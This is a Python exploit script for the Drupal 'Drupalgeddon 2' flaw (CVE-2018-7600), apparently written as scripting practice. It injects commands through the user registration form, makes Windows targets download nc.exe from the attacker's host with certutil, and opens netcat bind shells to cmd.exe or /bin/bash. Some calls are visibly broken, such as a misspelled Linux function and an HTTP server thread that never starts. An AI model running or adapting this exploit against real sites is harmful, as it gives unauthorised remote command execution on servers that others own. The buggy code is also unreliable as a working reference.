#!/usr/bin/python3
#CVE 2018-7600 (Drupalgeddon 2)
#Usage: python3 d2shell.py target lhost windows
#j3ss1: it's not much i know, just practicing some scripting :)

import os
import sys
import requests
import threading
import socket
import time
import os.path
from os import path

#Supply arguments.
target = sys.argv[1]
lhost = sys.argv[2]
os_type = sys.argv[3]

#Define payload/exploit for shell.
def shell_win():
    if path.exists("nc.exe"):
        setup_http()
    else:
        download_netcat()
    print("[!] Sending payload [!]")
    url = 'http://' + target +'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': shell }
    r = requests.post(url, data=payload)
    fire_and_forget_win()
    shell_connect()

def shell_linux():
    print("[!] Sending payload [!]")
    url = 'http://' + target +'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    fire_and_forget_linux()
    shell_connect()


#Define shell connection via netcat.
def shell_connect():
    print("[+] Payload Sent [+]")
    print("[+] Executing Shell Payload [+]")
    print("ðŸ’€ Connecting to your shell ðŸ’€")
    print("[!] Waiting 5 seconds [!]")
    time.sleep(5)
    os.system('nc -nv ' + target +' 4444')


#Configure http.server background task.
def serve_payload():
    os.system('python3 -m http.server 80')
def setup_http():
    threading.Thread(target=serve_payload)


#Download netcat binary if not already in pwd.    
def download_netcat():
    os.system('wget https://raw.githubusercontent.com/int0x33/nc.exe/master/nc.exe')


#Define bind_shell task to fire and forget.  
def bind_shell_win():
    url = 'http://' + target +'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    shell2 = 'nc.exe -lvnp 4444 -e cmd.exe'
    payload2 = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': shell2 }
    requests.post(url, data=payload2)
def fire_and_forget_win():
    threading.Thread(target=bind_shell_win).start()
    
def bind_shell_linux():
    url = 'http://' + target +'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    shell2 = 'nc -lvnp 4444 -e /bin/bash'
    payload2 = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': shell2 }
    requests.post(url, data=payload2)
def fire_and_forget_linux():
    threading.Thread(target=bind_shell_linux).start()


#Check if nc.exe is in pwd to upload to victim.
if path.exists("nc.exe"):
    setup_http()
else:
    download_netcat()

    
#Configure payload based on os_type.
if os_type == 'windows':
    shell = 'certutil.exe -urlcache -f http://"{0}"/nc.exe nc.exe'.format(lhost)
    print("[!] Windows Payload Configured [!]")
    shell_win()
else:
    print("[!] Linux Payload Configured [!]")
    shell_linx()
